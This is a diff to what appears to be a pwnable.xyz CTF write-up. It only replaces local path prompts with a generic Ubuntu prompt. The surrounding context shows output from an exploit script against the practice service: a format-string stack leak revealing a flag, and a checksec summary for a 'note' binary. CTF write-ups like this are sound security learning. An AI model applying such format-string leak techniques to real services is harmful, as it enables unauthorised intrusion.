@@ -330,7 +330,7 @@ r.interactive()
 ```
 exploit:
 ```bash
-junheah@DESKTOP-RU0PI5L:/mnt/c/Users/Junhea/Desktop/hacking/ctf.wargame/pwnablexyz$ python exp.py
+junheah@ubuntu:~$ python exp.py
 [+] Opening connection to svc.pwnable.xyz on port 30004: Done
 [*] Switching to interactive mode
 Welcome 0x6010e0 0x7f73401958c0 (nil) 0x7f73403bc500 0x8 0x10401a83d0 0x2449260 0x6161616161616179 FLAG{should_have_named_it_babyfsb} 0x7ffe6e30c2b0 0x7081d0c33e1faa00 0x400970 0x7f733fdfdeae 0x100000 0x7ffe6e30c2b8 0x13ff59428 0x400865 (nil) 0x90a4c3c5d8057cd3 0x4006e0 (nil) (nil) (nil) 0x6f581f2449257cd3 0x6e42bcfa76297cd3 (nil) (nil) (nil) 0x7ffe6e30c2c8 0x7f73403c1190 0x7f73401a832b (nil)
@@ -438,7 +438,7 @@ r.interactive()
 exploit:
 ```bash
 junheah@ubuntu:~$ python exp.py
-[*] '/mnt/c/Users/Junhea/Desktop/hacking/ctf.wargame/pwnablexyz/note'
+[*] './note'
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    Canary found
